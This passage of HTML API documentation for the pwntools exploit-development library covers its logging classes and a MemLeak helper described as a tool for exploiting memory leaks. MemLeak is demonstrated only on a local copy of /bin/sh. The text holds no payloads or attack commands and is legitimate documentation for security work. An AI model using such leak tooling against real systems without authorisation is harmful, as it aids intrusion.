<code class="docutils literal"><span class="pre">'pwnlib_msgtype'</span></code> on the <code class="docutils literal"><span class="pre">extra</span></code> field to signal which kind of message was
generated.  This information is used by the formatter to prepend a symbol to the
message, e.g. <code class="docutils literal"><span class="pre">'[+]</span> <span class="pre">'</span></code> in <code class="docutils literal"><span class="pre">'[+]</span> <span class="pre">got</span> <span class="pre">a</span> <span class="pre">shell!'</span></code></p>
<p>This field is ignored when using the <code class="docutils literal"><span class="pre">logging</span></code> module&#8217;s standard formatters.</p>
<p>All status updates (which are not dropped due to throttling) on progress loggers
result in a log record being created.  The <code class="docutils literal"><span class="pre">extra</span></code> field then carries a
reference to the <code class="docutils literal"><span class="pre">Progress</span></code> logger as <code class="docutils literal"><span class="pre">'pwnlib_progress'</span></code>.</p>
<p>If the custom handler determines that <code class="xref py py-data docutils literal"><span class="pre">term.term_mode</span></code> is enabled, log
records that have a <code class="docutils literal"><span class="pre">'pwnlib_progess'</span></code> in their <code class="docutils literal"><span class="pre">extra</span></code> field will not
result in a message being emitted but rather an animated progress line (with a
spinner!) being created.  Note that other handlers will still see a meaningful
log record.</p>
<p>The custom handler will only handle log records whith a level of at least
<code class="xref py py-data docutils literal"><span class="pre">context.log_level</span></code>.  Thus if e.g. the level for the
<code class="docutils literal"><span class="pre">'pwnlib.tubes.ssh'</span></code> is set to <code class="docutils literal"><span class="pre">'DEBUG'</span></code> no additional output will show up
unless <code class="xref py py-data docutils literal"><span class="pre">context.log_level</span></code> is also set to <code class="docutils literal"><span class="pre">'DEBUG'</span></code>.  Other handlers
will however see the extra log records generated by the <code class="docutils literal"><span class="pre">'pwnlib.tubes.ssh'</span></code>
logger.</p>
<dl class="function">
<dt id="pwnlib.log.install_default_handler">
<code class="descclassname">pwnlib.log.</code><code class="descname">install_default_handler</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L666-679"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.install_default_handler" title="Permalink to this definition">¶</a></dt>
<dd><p>Instantiates a <a class="reference internal" href="#pwnlib.log.Handler" title="pwnlib.log.Handler"><code class="xref py py-class docutils literal"><span class="pre">Handler</span></code></a> and <a class="reference internal" href="#pwnlib.log.Formatter" title="pwnlib.log.Formatter"><code class="xref py py-class docutils literal"><span class="pre">Formatter</span></code></a> and installs them for
the <code class="docutils literal"><span class="pre">pwnlib</span></code> root logger.  This function is automatically called from when
importing <a class="reference internal" href="index.html#module-pwn" title="pwn"><code class="xref py py-mod docutils literal"><span class="pre">pwn</span></code></a>.</p>
</dd></dl>

</div>
<dl class="class">
<dt id="pwnlib.log.Progress">
<em class="property">class </em><code class="descclassname">pwnlib.log.</code><code class="descname">Progress</code><span class="sig-paren">(</span><em>logger</em>, <em>msg</em>, <em>status</em>, <em>level</em>, <em>args</em>, <em>kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Progress" title="Permalink to this definition">¶</a></dt>
<dd><p>Progress logger used to generate log records associated with some running
job.  Instances can be used as context managers which will automatically
declare the running job a success upon exit or a failure upon a thrown
exception.  After <a class="reference internal" href="#pwnlib.log.Progress.success" title="pwnlib.log.Progress.success"><code class="xref py py-meth docutils literal"><span class="pre">success()</span></code></a> or <a class="reference internal" href="#pwnlib.log.Progress.failure" title="pwnlib.log.Progress.failure"><code class="xref py py-meth docutils literal"><span class="pre">failure()</span></code></a> is called the status
can no longer be updated.</p>
<p>This class is intended for internal use.  Progress loggers should be created
using <a class="reference internal" href="#pwnlib.log.Logger.progress" title="pwnlib.log.Logger.progress"><code class="xref py py-meth docutils literal"><span class="pre">Logger.progress()</span></code></a>.</p>
<dl class="method">
<dt id="pwnlib.log.Progress.status">
<code class="descname">status</code><span class="sig-paren">(</span><em>status</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L195-208"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Progress.status" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs a status update for the running job.</p>
<p>If the progress logger is animated the status line will be updated in
place.</p>
<p>Status updates are throttled at one update per 100ms.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Progress.success">
<code class="descname">success</code><span class="sig-paren">(</span><em>status = 'Done'</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L210-219"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Progress.success" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs that the running job succeeded.  No further status updates are
allowed.</p>
<p>If the Logger is animated, the animation is stopped.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Progress.failure">
<code class="descname">failure</code><span class="sig-paren">(</span><em>message</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L221-230"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Progress.failure" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs that the running job failed.  No further status updates are
allowed.</p>
<p>If the Logger is animated, the animation is stopped.</p>
</dd></dl>

</dd></dl>

<dl class="class">
<dt id="pwnlib.log.Logger">
<em class="property">class </em><code class="descclassname">pwnlib.log.</code><code class="descname">Logger</code><span class="sig-paren">(</span><em>logger=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger" title="Permalink to this definition">¶</a></dt>
<dd><p>A class akin to the <a class="reference external" href="https://docs.python.org/2.7/library/logging.html#logging.LoggerAdapter" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">logging.LoggerAdapter</span></code></a> class.  All public
methods defined on <a class="reference external" href="https://docs.python.org/2.7/library/logging.html#logging.Logger" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">logging.Logger</span></code></a> instances are defined on this
class.</p>
<p>Also adds some <code class="docutils literal"><span class="pre">pwnlib</span></code> flavor:</p>
<ul class="simple">
<li><a class="reference internal" href="#pwnlib.log.Logger.progress" title="pwnlib.log.Logger.progress"><code class="xref py py-meth docutils literal"><span class="pre">progress()</span></code></a> (alias <a class="reference internal" href="#pwnlib.log.Logger.waitfor" title="pwnlib.log.Logger.waitfor"><code class="xref py py-meth docutils literal"><span class="pre">waitfor()</span></code></a>)</li>
<li><a class="reference internal" href="#pwnlib.log.Logger.success" title="pwnlib.log.Logger.success"><code class="xref py py-meth docutils literal"><span class="pre">success()</span></code></a></li>
<li><a class="reference internal" href="#pwnlib.log.Logger.failure" title="pwnlib.log.Logger.failure"><code class="xref py py-meth docutils literal"><span class="pre">failure()</span></code></a></li>
<li><a class="reference internal" href="#pwnlib.log.Logger.indented" title="pwnlib.log.Logger.indented"><code class="xref py py-meth docutils literal"><span class="pre">indented()</span></code></a></li>
<li><a class="reference internal" href="#pwnlib.log.Logger.info_once" title="pwnlib.log.Logger.info_once"><code class="xref py py-meth docutils literal"><span class="pre">info_once()</span></code></a></li>
<li><a class="reference internal" href="#pwnlib.log.Logger.warning_once" title="pwnlib.log.Logger.warning_once"><code class="xref py py-meth docutils literal"><span class="pre">warning_once()</span></code></a> (alias <a class="reference internal" href="#pwnlib.log.Logger.warn_once" title="pwnlib.log.Logger.warn_once"><code class="xref py py-meth docutils literal"><span class="pre">warn_once()</span></code></a>)</li>
</ul>
<p>Adds <code class="docutils literal"><span class="pre">pwnlib</span></code>-specific information for coloring, indentation and progress
logging via log records <code class="docutils literal"><span class="pre">extra</span></code> field.</p>
<p>Loggers instantiated with <code class="xref py py-func docutils literal"><span class="pre">getLogger()</span></code> will be of this class.</p>
<dl class="method">
<dt id="pwnlib.log.Logger.progress">
<code class="descname">progress</code><span class="sig-paren">(</span><em>message</em>, <em>status = ''</em>, <em>*args</em>, <em>level = logging.INFO</em>, <em>**kwargs</em><span class="sig-paren">)</span> &#x2192; Progress<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L293-316"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.progress" title="Permalink to this definition">¶</a></dt>
<dd><p>Creates a new progress logger which creates log records with log level
<cite>level</cite>.</p>
<p>Progress status can be updated using <a class="reference internal" href="#pwnlib.log.Progress.status" title="pwnlib.log.Progress.status"><code class="xref py py-meth docutils literal"><span class="pre">Progress.status()</span></code></a> and stopped
using <a class="reference internal" href="#pwnlib.log.Progress.success" title="pwnlib.log.Progress.success"><code class="xref py py-meth docutils literal"><span class="pre">Progress.success()</span></code></a> or <a class="reference internal" href="#pwnlib.log.Progress.failure" title="pwnlib.log.Progress.failure"><code class="xref py py-meth docutils literal"><span class="pre">Progress.failure()</span></code></a>.</p>
<p>If <cite>term.term_mode</cite> is enabled the progress logger will be animated.</p>
<p>The progress manager also functions as a context manager.  Using context
managers ensures that animations stop even if an exception is raised.</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">with</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s1">&#39;Trying something...&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
        <span class="n">p</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s2">&quot;At </span><span class="si">%i</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="o">/</span><span class="mi">0</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.waitfor">
<code class="descname">waitfor</code><span class="sig-paren">(</span><em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L318-320"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.waitfor" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference internal" href="#pwnlib.log.Logger.progress" title="pwnlib.log.Logger.progress"><code class="xref py py-meth docutils literal"><span class="pre">progress()</span></code></a>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.indented">
<code class="descname">indented</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>level = logging.INFO</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L322-332"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.indented" title="Permalink to this definition">¶</a></dt>
<dd><p>Log a message but don&#8217;t put a line prefix on it.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>level</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Alternate log level at which to set the indented
message.  Defaults to <code class="xref py py-const docutils literal"><span class="pre">logging.INFO</span></code>.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.success">
<code class="descname">success</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L334-339"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.success" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs a success message.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.failure">
<code class="descname">failure</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L341-346"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.failure" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs a failure message.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.info_once">
<code class="descname">info_once</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L348-357"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.info_once" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs an info message.  The same message is never printed again.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.warning_once">
<code class="descname">warning_once</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L359-368"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.warning_once" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs a warning message.  The same message is never printed again.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.warn_once">
<code class="descname">warn_once</code><span class="sig-paren">(</span><em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L370-372"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.warn_once" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference internal" href="#pwnlib.log.Logger.warning_once" title="pwnlib.log.Logger.warning_once"><code class="xref py py-meth docutils literal"><span class="pre">warning_once()</span></code></a>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.debug">
<code class="descname">debug</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L376-381"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.debug" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs a debug message.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.info">
<code class="descname">info</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L383-388"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.info" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs an info message.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.warning">
<code class="descname">warning</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L398-403"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.warning" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs a warning message.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.warn">
<code class="descname">warn</code><span class="sig-paren">(</span><em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L405-407"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.warn" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference internal" href="#pwnlib.log.Logger.warning" title="pwnlib.log.Logger.warning"><code class="xref py py-meth docutils literal"><span class="pre">warning()</span></code></a>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.error">
<code class="descname">error</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L409-417"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.error" title="Permalink to this definition">¶</a></dt>
<dd><p>To be called outside an exception handler.</p>
<p>Logs an error message, then raises a <code class="docutils literal"><span class="pre">PwnlibException</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.exception">
<code class="descname">exception</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L419-428"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.exception" title="Permalink to this definition">¶</a></dt>
<dd><p>To be called from an exception handler.</p>
<p>Logs a error message, then re-raises the current exception.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.critical">
<code class="descname">critical</code><span class="sig-paren">(</span><em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L430-435"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.critical" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs a critical message.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.log">
<code class="descname">log</code><span class="sig-paren">(</span><em>level</em>, <em>message</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L437-443"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.log" title="Permalink to this definition">¶</a></dt>
<dd><p>Logs a message with log level <cite>level</cite>.  The <code class="docutils literal"><span class="pre">pwnlib</span></code> formatter will
use the default <a class="reference external" href="https://docs.python.org/2.7/library/logging.html#module-logging" title="(in Python v2.7)"><code class="xref py py-mod docutils literal"><span class="pre">logging</span></code></a> formater to format this message.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.isEnabledFor">
<code class="descname">isEnabledFor</code><span class="sig-paren">(</span><em>level</em><span class="sig-paren">)</span> &#x2192; bool<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L445-454"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.isEnabledFor" title="Permalink to this definition">¶</a></dt>
<dd><p>See if the underlying logger is enabled for the specified level.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.setLevel">
<code class="descname">setLevel</code><span class="sig-paren">(</span><em>level</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L456-462"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.setLevel" title="Permalink to this definition">¶</a></dt>
<dd><p>Set the logging level for the underlying logger.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.addHandler">
<code class="descname">addHandler</code><span class="sig-paren">(</span><em>handler</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L464-469"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.addHandler" title="Permalink to this definition">¶</a></dt>
<dd><p>Add the specified handler to the underlying logger.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.log.Logger.removeHandler">
<code class="descname">removeHandler</code><span class="sig-paren">(</span><em>handler</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L471-476"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Logger.removeHandler" title="Permalink to this definition">¶</a></dt>
<dd><p>Remove the specified handler from the underlying logger.</p>
</dd></dl>

</dd></dl>

<dl class="class">
<dt id="pwnlib.log.Handler">
<em class="property">class </em><code class="descclassname">pwnlib.log.</code><code class="descname">Handler</code><span class="sig-paren">(</span><em>stream=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Handler" title="Permalink to this definition">¶</a></dt>
<dd><p>A custom handler class.  This class will report whatever
<code class="xref py py-data docutils literal"><span class="pre">context.log_level</span></code> is currently set to as its log level.</p>
<p>If <code class="xref py py-data docutils literal"><span class="pre">term.term_mode</span></code> is enabled log records originating from a progress
logger will not be emitted but rather an animated progress line will be
created.</p>
<p>An instance of this handler is added to the <code class="docutils literal"><span class="pre">'pwnlib'</span></code> logger.</p>
<p>Initialize the handler.</p>
<p>If stream is not specified, sys.stderr is used.</p>
<dl class="method">
<dt id="pwnlib.log.Handler.emit">
<code class="descname">emit</code><span class="sig-paren">(</span><em>record</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py#L504-571"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Handler.emit" title="Permalink to this definition">¶</a></dt>
<dd><p>Emit a log record or create/update an animated progress logger
depending on whether <code class="xref py py-data docutils literal"><span class="pre">term.term_mode</span></code> is enabled.</p>
</dd></dl>

</dd></dl>

<dl class="class">
<dt id="pwnlib.log.Formatter">
<em class="property">class </em><code class="descclassname">pwnlib.log.</code><code class="descname">Formatter</code><span class="sig-paren">(</span><em>fmt=None</em>, <em>datefmt=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/log.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.log.Formatter" title="Permalink to this definition">¶</a></dt>
<dd><p>Logging formatter which performs custom formatting for log records
containing the <code class="docutils literal"><span class="pre">'pwnlib_msgtype'</span></code> attribute.  Other records are formatted
using the <cite>logging</cite> modules default formatter.</p>
<p>If <code class="docutils literal"><span class="pre">'pwnlib_msgtype'</span></code> is set, it performs the following actions:</p>
<ul class="simple">
<li>A prefix looked up in <cite>_msgtype_prefixes</cite> is prepended to the message.</li>
<li>The message is prefixed such that it starts on column four.</li>
<li>If the message spans multiple lines they are split, and all subsequent
lines are indented.</li>
</ul>
<p>This formatter is used by the handler installed on the <code class="docutils literal"><span class="pre">'pwnlib'</span></code> logger.</p>
<p>Initialize the formatter with specified format strings.</p>
<p>Initialize the formatter either with the specified format string, or a
default as described above. Allow for specialized date formatting with
the optional datefmt argument (if omitted, you get the ISO8601 format).</p>
</dd></dl>

</div>
<span id="document-memleak"></span><div class="section" id="module-pwnlib.memleak">
<span id="pwnlib-memleak-helper-class-for-leaking-memory"></span><h3><a class="reference internal" href="#module-pwnlib.memleak" title="pwnlib.memleak"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.memleak</span></code></a> &#8212; Helper class for leaking memory<a class="headerlink" href="#module-pwnlib.memleak" title="Permalink to this headline">¶</a></h3>
<dl class="class">
<dt id="pwnlib.memleak.MemLeak">
<em class="property">class </em><code class="descclassname">pwnlib.memleak.</code><code class="descname">MemLeak</code><span class="sig-paren">(</span><em>f</em>, <em>search_range=20</em>, <em>reraise=True</em>, <em>relative=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak" title="Permalink to this definition">¶</a></dt>
<dd><p>MemLeak is a caching and heuristic tool for exploiting memory leaks.</p>
<p>It can be used as a decorator, around functions of the form:</p>
<blockquote>
<div><dl class="docutils">
<dt>def some_leaker(addr):</dt>
<dd>...
return data_as_string_or_None</dd>
</dl>
</div></blockquote>
<p>It will cache leaked memory (which requires either non-randomized static
data or a continouous session). If required, dynamic or known data can be
set with the set-functions, but this is usually not required. If a byte
cannot be recovered, it will try to leak nearby bytes in the hope that the
byte is recovered as a side-effect.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>f</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.function" title="pwnlib.shellcraft.i386.function"><em>function</em></a>) &#8211; The leaker function.</li>
<li><strong>search_range</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; How many bytes to search backwards in case an address does not work.</li>
<li><strong>reraise</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to reraise call <code class="xref py py-func docutils literal"><span class="pre">pwnlib.log.warning()</span></code> in case the leaker function throws an exception.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">pwnlib</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binsh</span> <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">misc</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nd">@pwnlib</span><span class="o">.</span><span class="n">memleak</span><span class="o">.</span><span class="n">MemLeak</span>
<span class="gp">... </span><span class="k">def</span> <span class="nf">leaker</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="s2">&quot;leaking 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span>
<span class="gp">... </span>    <span class="k">return</span> <span class="n">binsh</span><span class="p">[</span><span class="n">addr</span><span class="p">:</span><span class="n">addr</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">leaker</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
<span class="go">leaking 0x0</span>
<span class="go">leaking 0x4</span>
<span class="go">&#39;\x7fELF&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">leaker</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
<span class="go">&#39;\x7fELF&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">leaker</span><span class="o">.</span><span class="n">d</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="go">&#39;0x464c457f&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">leaker</span><span class="o">.</span><span class="n">clearb</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="go">&#39;0x45&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">leaker</span><span class="o">.</span><span class="n">d</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="go">leaking 0x1</span>
<span class="go">&#39;0x464c457f&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nd">@pwnlib</span><span class="o">.</span><span class="n">memleak</span><span class="o">.</span><span class="n">MemLeak</span>
<span class="gp">... </span><span class="k">def</span> <span class="nf">leaker_nonulls</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="s2">&quot;leaking 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span>
<span class="gp">... </span>    <span class="k">if</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
<span class="gp">... </span>        <span class="k">return</span> <span class="kc">None</span>
<span class="gp">... </span>    <span class="k">return</span> <span class="n">binsh</span><span class="p">[</span><span class="n">addr</span><span class="p">:</span><span class="n">addr</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">leaker_nonulls</span><span class="o">.</span><span class="n">d</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="kc">None</span>
<span class="go">leaking 0x0</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">leaker_nonulls</span><span class="p">[</span><span class="mh">0x100</span><span class="p">:</span><span class="mh">0x104</span><span class="p">]</span> <span class="o">==</span> <span class="n">binsh</span><span class="p">[</span><span class="mh">0x100</span><span class="p">:</span><span class="mh">0x104</span><span class="p">]</span>
<span class="go">leaking 0x100</span>
<span class="go">leaking 0xff</span>
<span class="go">leaking 0x103</span>
<span class="go">True</span>
</pre></div>
</div>
